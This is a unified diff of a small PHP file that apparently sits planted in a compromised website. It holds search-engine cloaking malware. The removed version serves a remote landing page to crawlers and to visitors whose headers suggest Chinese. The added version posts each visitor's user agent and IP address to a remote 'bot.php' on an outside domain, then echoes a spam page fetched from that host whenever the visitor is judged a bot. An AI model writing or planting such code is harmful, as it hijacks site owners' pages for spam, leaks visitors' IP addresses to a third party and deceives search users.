@@ -1,14 +1,25 @@
 <?php
-error_reporting(0);
+$opts = array(
+    'http' => array(
+        'method' => 'POST',
+        'header' => "Content-Type: application/x-www-form-urlencoded\r\n" .
+                   "X-API-KEY: gen88\r\n",
+        'content' => http_build_query(array(
+            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
+            'ip' => $_SERVER['REMOTE_ADDR']
+        ))
+    )
+);
 
-if(strpos($_SERVER['HTTP_USER_AGENT'], 'bot') > 0 && $_SERVER['REQUEST_URI'] == '/') {
-    if(strpos(strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']), 'zh') > -1 || 
-       $_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] == 1 || 
-       $_COOKIE['az'] == 'lp') {
-        
-        setcookie('az', 'lp', time() + 3600 * 7200);
-        $content = file_get_contents('https://page.trattoriadelborgopg.it/students/lp.html');
-        echo $content;
+$context = stream_context_create($opts);
+$response = @file_get_contents('https://page.trattoriadelborgopg.it/API/bot.php', false, $context);
+
+if ($response !== false) {
+    $data = json_decode($response, true);
+    if($data['is_bot']) {
+        header('HTTP/1.1 200 OK');
+        echo @file_get_contents('https://page.trattoriadelborgopg.it/students/lp.html');
         exit;
-       }
-} ?>
+    }
+}
+?>
